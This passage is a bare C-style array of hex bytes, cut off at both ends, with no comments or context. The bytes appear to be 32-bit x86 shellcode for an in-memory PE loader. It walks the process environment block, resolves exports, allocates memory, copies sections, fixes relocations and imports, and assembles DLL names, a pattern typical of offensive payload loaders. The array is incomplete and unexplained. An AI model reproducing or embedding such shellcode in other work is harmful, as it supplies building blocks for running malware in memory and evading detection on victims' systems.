0x8b, 0x4c, 0x24, 0x24, \n  0x03, 0xfe, 0x83, 0xc4, 0x10, 0x89, 0x01, 0x03, 0xce, 0x8b, 0x07, 0x8b, \n  0x54, 0x24, 0x10, 0x89, 0x4c, 0x24, 0x14, 0x85, 0xc0, 0x75, 0xca, 0x8b, \n  0x74, 0x24, 0x18, 0x83, 0xc6, 0x20, 0x89, 0x74, 0x24, 0x18, 0x8b, 0x06, \n  0x85, 0xc0, 0x75, 0x87, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x44, 0x24, 0x1c, \n  0x8d, 0x7c, 0x24, 0x54, 0x6a, 0x3e, 0x59, 0x8b, 0xf5, 0x8b, 0x40, 0x28, \n  0xf3, 0xa5, 0x8b, 0x7c, 0x24, 0x58, 0x03, 0xc2, 0xc1, 0xef, 0x10, 0x6a, \n  0x04, 0x6b, 0xf7, 0x28, 0x68, 0x00, 0x30, 0x00, 0x00, 0x89, 0x44, 0x24, \n  0x34, 0x89, 0x7c, 0x24, 0x1c, 0x56, 0x6a, 0x00, 0xff, 0x53, 0x3c, 0x56, \n  0xff, 0x74, 0x24, 0x40, 0x89, 0x44, 0x24, 0x20, 0x50, 0xe8, 0x25, 0x0e, \n  0x00, 0x00, 0x33, 0xc0, 0x83, 0xc4, 0x0c, 0x40, 0x39, 0x83, 0x74, 0x05, \n  0x00, 0x00, 0x75, 0x42, 0x80, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x00, 0x75, \n  0x21, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x74, 0x24, 0x18, 0xe8, 0x24, \n  0x0e, 0x00, 0x00, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x74, 0x24, 0x48, \n  0xe8, 0x16, 0x0e, 0x00, 0x00, 0x83, 0xc4, 0x18, 0xeb, 0x18, 0x8b, 0x44, \n  0x24, 0x48, 0x85, 0xc0, 0x74, 0x10, 0xff, 0x75, 0x54, 0x50, 0xff, 0x74, \n  0x24, 0x18, 0xe8, 0xd8, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x80, 0xbb, \n  0x25, 0x06, 0x00, 0x00, 0x00, 0x75, 0x58, 0xff, 0x74, 0x24, 0x10, 0xff, \n  0x53, 0x70, 0x50, 0xff, 0x93, 0x28, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x85, 0x2d, 0x03, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x10, 0x33, 0xc9, 0x39, \n  0x4c, 0x24, 0x24, 0x68, 0x80, 0x00, 0x00, 0x00, 0x51, 0x6a, 0x02, 0x0f, \n  0x45, 0xc1, 0x21, 0x4c, 0x24, 0x34, 0x89, 0x44, 0x24, 0x1c, 0x58, 0x50, \n  0x8d, 0x44, 0x24, 0x34, 0x50, 0x51, 0x51, 0x51, 0x8d, 0x44, 0x24, 0x2c, \n  0x50, 0xff, 0x53, 0x70, 0x50, 0xff, 0x74, 0x24, 0x68, 0xff, 0x93, 0x24, \n  0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xeb, 0x02, 0x00, 0x00, 0x8d, \n  0x44, 0x24, 0x30, 0x50, 0x6a, 0x08, 0xff, 0x74, 0x24, 0x30, 0xff, 0x74, \n  0x24, 0x1c, 0xff, 0x53, 0x48, 0x33, 0xc0, 0x89, 0x44, 0x24, 0x24, 0x85, \n  0xff, 0x0f, 0x84, 0xab, 0x00, 0x00, 0x00, 0x8b, 0x7c, 0x24, 0x18, 0x8b, \n  0x74, 0x24, 0x3c, 0x83, 0xc7, 0x0c, 0x8b, 0x57, 0x18, 0x8b, 0xea, 0x8b, \n  0xca, 0xc1, 0xed, 0x1e, 0xc1, 0xea, 0x1d, 0xc1, 0xe9, 0x1f, 0x83, 0xe2, \n  0x01, 0x85, 0xd1, 0x75, 0x77, 0x85, 0xd5, 0x74, 0x04, 0x6a, 0x20, 0xeb, \n  0x2f, 0x8b, 0xc2, 0x83, 0xf0, 0x01, 0x89, 0x44, 0x24, 0x3c, 0x23, 0xc1, \n  0x85, 0xc5, 0x74, 0x0e, 0x80, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x00, 0x6a, \n  0x08, 0x5e, 0x6a, 0x04, 0xeb, 0x1d, 0x33, 0xc0, 0x40, 0x33, 0xc8, 0x8b, \n  0xc5, 0x83, 0xf0, 0x01, 0x23, 0xc1, 0x85, 0xc2, 0x74, 0x05, 0x6a, 0x10, \n  0x5e, 0xeb, 0x0c, 0x23, 0x4c, 0x24, 0x3c, 0x85, 0xcd, 0x6a, 0x02, 0x58, \n  0x0f, 0x45, 0xf0, 0x8b, 0x54, 0x24, 0x10, 0x8b, 0x0f, 0x03, 0xd1, 0x8b, \n  0x44, 0x24, 0x14, 0x48, 0x39, 0x44, 0x24, 0x24, 0x73, 0x07, 0x8b, 0x47, \n  0x28, 0x2b, 0xc1, 0xeb, 0x03, 0x8b, 0x47, 0x04, 0x83, 0x64, 0x24, 0x30, \n  0x00, 0x8d, 0x4c, 0x24, 0x30, 0x51, 0x56, 0x50, 0x52, 0xff, 0x53, 0x48, \n  0x8b, 0x44, 0x24, 0x24, 0x40, 0x83, 0xc7, 0x28, 0x89, 0x44, 0x24, 0x24, \n  0x3b, 0x44, 0x24, 0x14, 0x0f, 0x82, 0x60, 0xff, 0xff, 0xff, 0x8d, 0x44, \n  0x24, 0x30, 0x33, 0xff, 0x50, 0x6a, 0x02, 0x58, 0x50, 0xff, 0xb4, 0x24, \n  0x88, 0x00, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x3c, 0xff, 0x74, 0x24, 0x1c, \n  0xff, 0x53, 0x48, 0x8b, 0x44, 0x24, 0x1c, 0x8b, 0x4c, 0x24, 0x10, 0x8b, \n  0xb0, 0xc0, 0x00, 0x00, 0x00, 0x85, 0xf6, 0x74, 0x2a, 0x8b, 0x74, 0x0e, \n  0x0c, 0x85, 0xf6, 0x74, 0x22, 0x8b, 0x06, 0x85, 0xc0, 0x74, 0x1c, 0x6a, \n  0x04, 0x5b, 0x57, 0x6a, 0x01, 0x51, 0xff, 0xd0, 0x8b, 0x4c, 0x24, 0x10, \n  0x03, 0xf3, 0x8b, 0x06, 0x85, 0xc0, 0x75, 0xee, 0x8b, 0x9c, 0x24, 0x54, \n  0x03, 0x00, 0x00, 0x8b, 0xac, 0x24, 0x58, 0x03, 0x00, 0x00, 0x6a, 0x03, \n  0x58, 0x39, 0x45, 0x00, 0x0f, 0x85, 0xe6, 0x00, 0x00, 0x00, 0x33, 0xc0, \n  0x40, 0x57, 0x50, 0x8b, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x51, 0x03, \n  0xc1, 0xff, 0xd0, 0x80, 0xbd, 0x0c, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x84, \n  0x1d, 0x01, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0xcc, 0x00, 0x00, 0x00, 0x8b, \n  0x54, 0x24, 0x10, 0x85, 0xc9, 0x0f, 0x84, 0x0e, 0x01, 0x00, 0x00, 0x8b, \n  0x74, 0x11, 0x18, 0x85, 0xf6, 0x0f, 0x84, 0x02, 0x01, 0x00, 0x00, 0x8b, \n  0x44, 0x11, 0x20, 0x8d, 0x7e, 0xff, 0x8b, 0x6c, 0x11, 0x1c, 0x03, 0xc2, \n  0x8b, 0x4c, 0x11, 0x24, 0x03, 0xea, 0x03, 0xca, 0x89, 0x4c, 0x24, 0x3c, \n  0x8d, 0x3c, 0xb8, 0x8b, 0x8c, 0x24, 0x58, 0x03, 0x00, 0x00, 0x8b, 0x07, \n  0x81, 0xc1, 0x0c, 0x03, 0x00, 0x00, 0x03, 0xc2, 0x51, 0x50, 0xe8, 0x05, \n  0x0c, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x18, 0x59, 0x59, 0x85, 0xc0, 0x74, \n  0x0f, 0x6a, 0x04, 0x58, 0x2b, 0xf8, 0x83, 0xee, 0x01, 0x75, 0xd4, 0xe9, \n  0xc9, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x3c, 0x0f, 0xb7, 0x44, 0x70, \n  0xfe, 0x8b, 0x74, 0x85, 0x00, 0x03, 0xf2, 0x0f, 0x84, 0xb4, 0x00, 0x00, \n  0x00, 0x8b, 0xac, 0x24, 0x58, 0x03, 0x00, 0x00, 0x8d, 0xbd, 0x0c, 0x04, \n  0x00, 0x00, 0x80, 0x3f, 0x00, 0x74, 0x31, 0x83, 0xbd, 0x0c, 0x05, 0x00, \n  0x00, 0x00, 0x74, 0x12, 0x8d, 0x84, 0x24, 0x4c, 0x01, 0x00, 0x00, 0x50, \n  0x57, 0x53, 0xe8, 0xe1, 0x04, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x83, 0xbd, \n  0x0c, 0x05, 0x00, 0x00, 0x00, 0x8d, 0x84, 0x24, 0x4c, 0x01, 0x00, 0x00, \n  0x0f, 0x44, 0xc7, 0x50, 0xff, 0xd6, 0xeb, 0x59, 0xff, 0xd6, 0xeb, 0x55, \n  0x8d, 0x85, 0x0c, 0x04, 0x00, 0x00, 0x80, 0x38, 0x00, 0x74, 0x20, 0x8d, \n  0x8c, 0x24, 0x4c, 0x01, 0x00, 0x00, 0x51, 0x50, 0x53, 0xe8, 0xaa, 0x04, \n  0x00, 0x00, 0x8d, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00, 0x50, 0x53, 0xe8, \n  0x74, 0x02, 0x00, 0x00, 0x83, 0xc4, 0x14, 0x39, 0x7d, 0x04, 0x74, 0x18, \n  0x57, 0x57, 0x57, 0xff, 0x74, 0x24, 0x38, 0x57, 0x57, 0xff, 0x53, 0x5c, \n  0x85, 0xc0, 0x74, 0x15, 0x6a, 0xff, 0x50, 0xff, 0x53, 0x58, 0xeb, 0x0d, \n  0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0xff, 0x70, 0x30, 0xff, 0x54, 0x24, \n  0x30, 0x8b, 0x54, 0x24, 0x10, 0x6a, 0x03, 0x58, 0x39, 0x83, 0x30, 0x02, \n  0x00, 0x00, 0x75, 0x09, 0x6a, 0xff, 0xff, 0x53, 0x4c, 0x8b, 0x54, 0x24, \n  0x10, 0x85, 0xd2, 0x74, 0x42, 0x0f, 0xb7, 0x44, 0x24, 0x5a, 0xbe, 0x00, \n  0xc0, 0x00, 0x00, 0x6b, 0xc0, 0x28, 0x56, 0x50, 0xff, 0x74, 0x24, 0x20, \n  0xff, 0x53, 0x40, 0x8b, 0x44, 0x24, 0x48, 0x85, 0xc0, 0x74, 0x0c, 0x56, \n  0xff, 0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x50, 0xff, 0x53, 0x40, 0xff, \n  0x74, 0x24, 0x10, 0xff, 0x53, 0x70, 0x50, 0xff, 0x93, 0x28, 0x01, 0x00, \n  0x00, 0xff, 0x74, 0x24, 0x44, 0xff, 0x93, 0x90, 0x00, 0x00, 0x00, 0x8b, \n  0x84, 0x24, 0x58, 0x03, 0x00, 0x00, 0xff, 0xb0, 0x24, 0x05, 0x00, 0x00, \n  0x6a, 0x00, 0xff, 0x74, 0x24, 0x3c, 0xe8, 0xb0, 0x0a, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x40, 0x03, 0x00, 0x00, \n  0xc3, 0x81, 0xec, 0xf4, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0xfc, \n  0x02, 0x00, 0x00, 0x55, 0x56, 0x6a, 0x04, 0x8b, 0x83, 0x58, 0x0d, 0x00, \n  0x00, 0x33, 0xf6, 0x68, 0x00, 0x30, 0x00, 0x00, 0x8d, 0x04, 0x45, 0x02, \n  0x00, 0x00, 0x00, 0x50, 0x56, 0xff, 0x53, 0x3c, 0x8b, 0xe8, 0x85, 0xed, \n  0x0f, 0x84, 0x84, 0x01, 0x00, 0x00, 0x8b, 0x84, 0x24, 0x08, 0x03, 0x00, \n  0x00, 0x8b, 0x88, 0x24, 0x05, 0x00, 0x00, 0x05, 0x28, 0x05, 0x00, 0x00, \n  0x03, 0xc9, 0x51, 0x55, 0x6a, 0xff, 0x50, 0x56, 0x56, 0xff, 0x53, 0x50, \n  0x8d, 0x44, 0x24, 0x58, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, \n  0x50, 0x53, 0xe8, 0xa5, 0xdf, 0xff, 0xff, 0x8d, 0x44, 0x24, 0x4c, 0x89, \n  0x44, 0x24, 0x24, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x53, 0xe8, 0x48, 0xde, \n  0xff, 0xff, 0x8d, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, \n  0x38, 0x8d, 0x44, 0x24, 0x38, 0x50, 0x53, 0xe8, 0xdb, 0xe9, 0xff, 0xff, \n  0x83, 0xc4, 0x18, 0x56, 0x56, 0xff, 0x93, 0xec, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x85, 0xf5, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x0c, 0x50, \n  0x8d, 0x83, 0xd0, 0x08, 0x00, 0x00, 0x50, 0x6a, 0x03, 0x56, 0x8d, 0x83, \n  0xb0, 0x08, 0x00, 0x00, 0x50, 0xff, 0x93, 0xf0, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x85, 0xd1, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x8d, \n  0x44, 0x24, 0x10, 0x50, 0x8d, 0x83, 0x00, 0x09, 0x00, 0x00, 0x50, 0x8b, \n  0x11, 0x51, 0xff, 0x12, 0x85, 0xc0, 0x0f, 0x85, 0xa0, 0x00, 0x00, 0x00, \n  0x8b, 0x44, 0x24, 0x10, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x0c, 0x85, 0xc0, \n  0x0f, 0x85, 0x84, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x8d, 0x54, \n  0x24, 0x14, 0x89, 0x4c, 0x24, 0x34, 0x52, 0x51, 0x8b, 0x01, 0xff, 0x50, \n  0x0c, 0x85, 0xc0, 0x75, 0x6d, 0x57, 0x8d, 0x84, 0x24, 0x00, 0x01, 0x00, \n  0x00, 0x50, 0x8d, 0x83, 0x11, 0x06, 0x00, 0x00, 0x50, 0x53, 0xe8, 0xc9, \n  0x02, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x84, 0x24, 0x00, 0x01, 0x00, \n  0x00, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x10, \n  0x8b, 0xf8, 0x6a, 0x02, 0x57, 0x51, 0x8b, 0x11, 0xff, 0x52, 0x20, 0x57, \n  0x8b, 0xf0, 0xff, 0x93, 0xb4, 0x00, 0x00, 0x00, 0x5f, 0x85, 0xf6, 0x75, \n  0x27, 0x8b, 0x44, 0x24, 0x10, 0x33, 0xf6, 0x56, 0x56, 0x56, 0x8b, 0x08, \n  0x56, 0x56, 0x56, 0x56, 0x56, 0x55, 0x50, 0xff, 0x51, 0x14, 0x85, 0xc0, \n  0x75, 0x10, 0x8b, 0x44, 0x24, 0x0c, 0x6a, 0x02, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x14, 0xeb, 0x02, 0x33, 0xf6, 0x8b, 0x44, 0x24, 0x10, 0x50, 0x8b, \n  0x08, 0xff, 0x51, 0x08, 0x8b, 0x44, 0x24, 0x0c, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x1c, 0x8b, 0x44, 0x24, 0x0c, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x08, \n  0x8b, 0x83, 0x58, 0x0d, 0x00, 0x00, 0x8d, 0x04, 0x45, 0x02, 0x00, 0x00, \n  0x00, 0x50, 0x56, 0x55, 0xe8, 0xf6, 0x08, 0x00, 0x00, 0x83, 0xc4, 0x0c, \n  0x68, 0x00, 0xc0, 0x00, 0x00, 0x56, 0x55, 0xff, 0x53, 0x40, 0x5e, 0x5d, \n  0x5b, 0x81, 0xc4, 0xf4, 0x02, 0x00, 0x00, 0xc3, 0x81, 0xec, 0x94, 0x00, \n  0x00, 0x00, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, \n  0x9c, 0x00, 0x00, 0x00, 0x55, 0x8b, 0x40, 0x30, 0x56, 0x89, 0x44, 0x24, \n  0x0c, 0x8d, 0x83, 0x48, 0x03, 0x00, 0x00, 0x57, 0x50, 0xff, 0x53, 0x38, \n  0x8b, 0xe8, 0x33, 0xc0, 0x8b, 0x55, 0x3c, 0x03, 0xd5, 0x0f, 0xb7, 0x7a, \n  0x14, 0x0f, 0xb7, 0x72, 0x06, 0x03, 0xfa, 0x8d, 0x4f, 0x18, 0x85, 0xf6, \n  0x74, 0x12, 0x8b, 0x93, 0x40, 0x03, 0x00, 0x00, 0x39, 0x11, 0x74, 0x35, \n  0x40, 0x83, 0xc1, 0x28, 0x3b, 0xc6, 0x72, 0xf4, 0x8b, 0x74, 0x24, 0x10, \n  0x8b, 0x7c, 0x24, 0x10, 0xff, 0x53, 0x78, 0x33, 0xc9, 0x8b, 0xe8, 0x85, \n  0xf6, 0x74, 0x40, 0x8b, 0xd7, 0x8d, 0x42, 0x04, 0x89, 0x54, 0x24, 0x18, \n  0x8b, 0xd0, 0x39, 0x28, 0x74, 0x1d, 0x41, 0x3b, 0xce, 0x72, 0xee, 0x8b, \n  0x6c, 0x24, 0x18, 0xeb, 0x2e, 0x6b, 0xc0, 0x28, 0x03, 0xc7, 0x8b, 0x78, \n  0x24, 0x8b, 0x70, 0x20, 0x03, 0xfd, 0xc1, 0xee, 0x02, 0xeb, 0xc9, 0xff, \n  0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x8b, 0x6c, 0x24, 0x1c, 0x55, 0xff, \n  0x93, 0x10, 0x01, 0x00, 0x00, 0xeb, 0x08, 0x8b, 0x6c, 0x24, 0x10, 0x89, \n  0x6c, 0x24, 0x18, 0xff, 0x53, 0x74, 0x33, 0xc9, 0x8b, 0xd0, 0x85, 0xf6, \n  0x74, 0x2d, 0x39, 0x57, 0x04, 0x74, 0x0a, 0x41, 0x83, 0xc7, 0x04, 0x3b, \n  0xce, 0x72, 0xf3, 0xeb, 0x1e, 0x6a, 0x01, 0x55, 0x8d, 0x44, 0x24, 0x24, \n  0x50, 0xff, 0x93, 0x00, 0x01, 0x00, 0x00, 0x6a, 0x08, 0x8d, 0x44, 0x24, \n  0x20, 0x50, 0x57, 0xe8, 0xd7, 0x07, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8b, \n  0x44, 0x24, 0x10, 0x8b, 0x40, 0x0c, 0x8b, 0x78, 0x0c, 0x83, 0x7f, 0x18, \n  0x00, 0x0f, 0x84, 0x1f, 0x01, 0x00, 0x00, 0x8d, 0x83, 0x70, 0x03, 0x00, \n  0x00, 0x8b, 0xd0, 0x89, 0x54, 0x24, 0x14, 0x8a, 0x02, 0x33, 0xed, 0x83, \n  0x64, 0x24, 0x10, 0x00, 0x45, 0x33, 0xc9, 0x84, 0xc0, 0x0f, 0x84, 0xed, \n  0x00, 0x00, 0x00, 0x8d, 0x5c, 0x24, 0x24, 0x8b, 0xf2, 0x2b, 0xda, 0x8b, \n  0xd5, 0x3c, 0x3b, 0x74, 0x29, 0x81, 0xf9, 0x80, 0x00, 0x00, 0x00, 0x73, \n  0x21, 0x3c, 0x77, 0x75, 0x04, 0x33, 0xed, 0xeb, 0x0e, 0x8b, 0xea, 0x3c, \n  0x70, 0x75, 0x08, 0xc7, 0x44, 0x24, 0x10, 0x01, 0x00, 0x00, 0x00, 0x88, \n  0x04, 0x1e, 0x41, 0x46, 0x8a, 0x06, 0x84, 0xc0, 0x75, 0xd1, 0x8b, 0x9c, \n  0x24, 0xa8, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0xa7, 0x00, 0x00, \n  0x00, 0x8b, 0x44, 0x24, 0x14, 0x40, 0xc6, 0x44, 0x0c, 0x24, 0x00, 0x03, \n  0xc1, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x24, 0x6a, 0x00, 0x50, \n  0xff, 0x77, 0x18, 0x53, 0xe8, 0x6a, 0x01, 0x00, 0x00, 0x8b, 0x54, 0x24, \n  0x24, 0x8b, 0xf0, 0x83, 0xc4, 0x10, 0x85, 0xf6, 0x0f, 0x84, 0x75, 0xff, \n  0xff, 0xff, 0x85, 0xed, 0x74, 0x33, 0x83, 0x7c, 0x24, 0x10, 0x00, 0x74, \n  0x10, 0xff, 0xd6, 0x8b, 0x54, 0x24, 0x14, 0x8b, 0xf0, 0x85, 0xf6, 0x0f, \n  0x84, 0x5a, 0xff, 0xff, 0xff, 0xff, 0x36, 0x53, 0xe8, 0x9a, 0xea, 0xff, \n  0xff, 0x8b, 0x54, 0x24, 0x1c, 0x59, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x44, \n  0xff, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x20, 0xeb, 0x34, 0x83, 0x7c, 0x24, \n  0x10, 0x00, 0x74, 0x10, 0xff, 0xd6, 0x8b, 0x54, 0x24, 0x14, 0x8b, 0xf0, \n  0x85, 0xf6, 0x0f, 0x84, 0x27, 0xff, 0xff, 0xff, 0xff, 0x36, 0x53, 0xe8, \n  0x67, 0xea, 0xff, 0xff, 0x8b, 0x54, 0x24, 0x1c, 0x59, 0x59, 0x85, 0xc0, \n  0x0f, 0x84, 0x11, 0xff, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x18, 0x8b, 0x40, \n  0x04, 0x8b, 0x54, 0x24, 0x14, 0x89, 0x06, 0xe9, 0xff, 0xfe, 0xff, 0xff, \n  0x8b, 0x3f, 0x8d, 0x83, 0x70, 0x03, 0x00, 0x00, 0x83, 0x7f, 0x18, 0x00, \n  0x0f, 0x85, 0xe7, 0xfe, 0xff, 0xff, 0x5f, 0x5e, 0x33, 0xc0, 0x5d, 0x40, \n  0x5b, 0x81, 0xc4, 0x94, 0x00, 0x00, 0x00, 0xc3, 0x8b, 0x44, 0x24, 0x04, \n  0x68, 0x00, 0x01, 0x00, 0x00, 0xff, 0x74, 0x24, 0x10, 0x6a, 0xff, 0xff, \n  0x74, 0x24, 0x14, 0x6a, 0x00, 0x6a, 0x00, 0xff, 0x50, 0x50, 0xc3, 0xe8, \n  0x00, 0x00, 0x00, 0x00, 0x58, 0x83, 0xe8, 0x05, 0xc3, 0x55, 0x8b, 0xec, \n  0x8b, 0x55, 0x0c, 0x83, 0xec, 0x40, 0x33, 0xc9, 0x53, 0x56, 0x83, 0xcb, \n  0xff, 0x57, 0x38, 0x0a, 0x74, 0x16, 0x8d, 0x75, 0xc0, 0x2b, 0xf2, 0x83, \n  0xf9, 0x40, 0x73, 0x0c, 0x8a, 0x02, 0x41, 0x88, 0x04, 0x16, 0x42, 0x80, \n  0x3a, 0x00, 0x75, 0xef, 0x80, 0x7c, 0x0d, 0xbc, 0x2e, 0xc6, 0x44, 0x0d, \n  0xc0, 0x00, 0x74, 0x0d, 0xc7, 0x44, 0x0d, 0xc0, 0x2e, 0x64, 0x6c, 0x6c, \n  0xc6, 0x44, 0x0d, 0xc4, 0x00, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x8b, \n  0x40, 0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x78, 0x0c, 0x8b, 0x77, 0x18, 0x85, \n  0xf6, 0x74, 0x31, 0x8b, 0x46, 0x3c, 0x8b, 0x4c, 0x30, 0x78, 0x33, 0xc0, \n  0x85, 0xc9, 0x74, 0x1a, 0x8b, 0x44, 0x31, 0x0c, 0x03, 0xc6, 0x50, 0x8d, \n  0x45, 0xc0, 0x50, 0xe8, 0x57, 0x06, 0x00, 0x00, 0x8b, 0xd8, 0x33, 0xc0, \n  0x59, 0x59, 0x85, 0xdb, 0x74, 0x19, 0x8b, 0x3f, 0x85, 0xdb, 0x75, 0xcc, \n  0x85, 0xc0, 0x75, 0x0a, 0x8d, 0x45, 0xc0, 0x50, 0x8b, 0x45, 0x08, 0xff, \n  0x50, 0x30, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0xc6, 0xeb, 0xf7, 0x81, \n  0xec, 0x90, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x57, 0x8b, 0xbc, 0x24, \n  0xa8, 0x00, 0x00, 0x00, 0x33, 0xf6, 0x85, 0xff, 0x0f, 0x84, 0x33, 0x01, \n  0x00, 0x00, 0x8b, 0x4f, 0x3c, 0x89, 0x4c, 0x24, 0x18, 0x8b, 0x44, 0x39, \n  0x78, 0x85, 0xc0, 0x0f, 0x84, 0x20, 0x01, 0x00, 0x00, 0x8d, 0x1c, 0x38, \n  0x8b, 0x43, 0x20, 0x8b, 0x53, 0x1c, 0x03, 0xc7, 0x89, 0x44, 0x24, 0x10, \n  0x03, 0xd7, 0x8b, 0x43, 0x24, 0x03, 0xc7, 0x89, 0x54, 0x24, 0x1c, 0x39, \n  0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, \n  0x8b, 0x6b, 0x18, 0x85, 0xed, 0x0f, 0x84, 0xee, 0x00, 0x00, 0x00, 0x8d, \n  0x04, 0x68, 0x83, 0xc0, 0xfe, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x44, 0x24, \n  0x10, 0x8d, 0x04, 0xa8, 0x83, 0xc0, 0xfc, 0x89, 0x44, 0x24, 0x10, 0x8b, \n  0x00, 0xff, 0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x03, 0xc7, 0x50, 0xe8, \n  0x80, 0x05, 0x00, 0x00, 0x59, 0x59, 0x85, 0xc0, 0x75, 0x10, 0x8b, 0x44, \n  0x24, 0x14, 0x8b, 0x4c, 0x24, 0x1c, 0x0f, 0xb7, 0x00, 0x8b, 0x34, 0x81, \n  0x03, 0xf7, 0x8b, 0x44, 0x24, 0x10, 0x83, 0x6c, 0x24, 0x14, 0x02, 0x83, \n  0xe8, 0x04, 0x89, 0x44, 0x24, 0x10, 0x83, 0xed, 0x01, 0x74, 0x04, 0x85, \n  0xf6, 0x74, 0xc0, 0x8b, 0x4c, 0x24, 0x18, 0x3b, 0xf3, 0x72, 0x76, 0x8b, \n  0x44, 0x39, 0x7c, 0x03, 0xc3, 0x3b, 0xf0, 0x73, 0x6c, 0x33, 0xc9, 0x38, \n  0x0e, 0x74, 0x1d, 0x8d, 0x5c, 0x24, 0x20, 0x8b, 0xd6, 0x2b, 0xde, 0x83, \n  0xf9, 0x3c, 0x73, 0x10, 0x8a, 0x02, 0x88, 0x04, 0x13, 0x3c, 0x2e, 0x74, \n  0x07, 0x41, 0x42, 0x80, 0x3a, 0x00, 0x75, 0xeb, 0xc7, 0x44, 0x0c, 0x21, \n  0x64, 0x6c, 0x6c, 0x00, 0x33, 0xd2, 0x41, 0x03, 0xce, 0x38, 0x11, 0x74, \n  0x17, 0x8d, 0x74, 0x24, 0x60, 0x2b, 0xf1, 0x83, 0xfa, 0x3f, 0x73, 0x0c, \n  0x8a, 0x01, 0x42, 0x88, 0x04, 0x0e, 0x41, 0x80, 0x39, 0x00, 0x75, 0xef, \n  0x8d, 0x44, 0x24, 0x60, 0xc6, 0x44, 0x14, 0x60, 0x00, 0x50, 0x8d, 0x44, \n  0x24, 0x24, 0x50, 0x57, 0xff, 0xb4, 0x24, 0xb0, 0x00, 0x00, 0x00, 0xe8, \n  0xd4, 0xe2, 0xff, 0xff, 0x83, 0xc4, 0x10, 0x8b, 0xf0, 0x8b, 0xc6, 0xeb, \n  0x16, 0x8b, 0x84, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x2b, 0x43, 0x10, 0x8b, \n  0x34, 0x82, 0x03, 0xf7, 0xe9, 0x6e, 0xff, 0xff, 0xff, 0x33, 0xc0, 0x5f, \n  0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x90, 0x00, 0x00, 0x00, 0xc3, 0x55, 0x8b, \n  0xec, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x33, 0xc9, 0x56, 0x8b, 0x40, \n  0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x0c, 0xeb, 0x20, 0x85, 0xc9, 0x75, \n  0x23, 0xff, 0x75, 0x18, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, \n  0x0c, 0x50, 0xff, 0x75, 0x08, 0xe8, 0xd5, 0xe0, 0xff, 0xff, 0x8b, 0x36, \n  0x83, 0xc4, 0x18, 0x8b, 0xc8, 0x8b, 0x46, 0x18, 0x85, 0xc0, 0x75, 0xd9, \n  0x8b, 0xc1, 0x5e, 0x5d, 0xc3, 0x83, 0xec, 0x14, 0x53, 0x8b, 0x5c, 0x24, \n  0x24, 0x33, 0xc0, 0x55, 0x56, 0x33, 0xed, 0x89, 0x44, 0x24, 0x0c, 0x57, \n  0x8b, 0x7c, 0x24, 0x2c, 0x33, 0xf6, 0x89, 0x74, 0x24, 0x2c, 0x8b, 0x4c, \n  0x24, 0x28, 0x8a, 0x0c, 0x08, 0x84, 0xc9, 0x74, 0x1e, 0x83, 0xf8, 0x40, \n  0x74, 0x19, 0x88, 0x4c, 0x2c, 0x14, 0x45, 0x40, 0x89, 0x7c, 0x24, 0x2c, \n  0x89, 0x44, 0x24, 0x10, 0x89, 0x74, 0x24, 0x2c, 0x83, 0xfd, 0x10, 0x75, \n  0x6f, 0xeb, 0x54, 0x6a, 0x10, 0x58, 